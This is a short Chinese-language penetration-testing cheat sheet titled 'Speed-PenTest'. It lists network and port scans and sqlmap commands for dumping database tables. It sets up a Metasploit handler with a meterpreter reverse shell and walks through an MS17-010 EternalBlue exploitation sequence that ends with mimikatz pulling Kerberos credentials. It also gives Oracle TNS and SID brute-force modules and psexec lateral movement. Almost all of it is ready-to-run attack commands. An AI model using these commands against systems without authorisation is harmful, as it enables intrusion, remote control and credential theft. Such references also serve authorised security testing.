# Speed-PenTest 
`出渗透测试报告也是需要技巧的`
[TOC]

---

# 通用
## 信息收集
### IP扫
>netdiscover -r 1.1.1.0/24

### 端口扫
>nmap -T5 -A -v 1.1.1.1

---

# web
## SQL注入
### sqlmap
```sql
sqlmap -u URL	判断注入
sqlmap -u URL --current-db	 获取当前数据库
sqlmap -u URL -D DATABASE --tables		获取数据库表
sqlmap -u URL -D DATABASE -T TABLES --columns	获取指定表的列名
sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump		获取指定表的列名
```

## 业务渗透
### openssl
MassBleed
sslscan
testssl

---

# 监听器
## handler
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST
set LPORT
```

## exp
### ms17-010
```bash
发现，检测
use auxiliary/scanner/smb/smb_ms17_010

使用payload连上去
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set lhost   #设一下本机地址
set rhosts 
run

msf 下
加载mimikatz模块
load mimikatz
kerberos
```

## poc
### CVE-2012-1675 Oracle TNS Listener Remote Poisoning
```bash
use auxiliary/admin/oracle/tnscmd   #该漏洞可以远程获取到oracle的内存信息，若是能获取到内存中的数据即为存在漏洞。
use auxiliary/admin/oracle/sid_brute  #爆破oracle的SID
```

## 域
cmd 下
```bash
#如果没有psexec工具记得找pstool工具包，传一个上去
psexec \\hostIp -u [username] -p [password] cmd
```
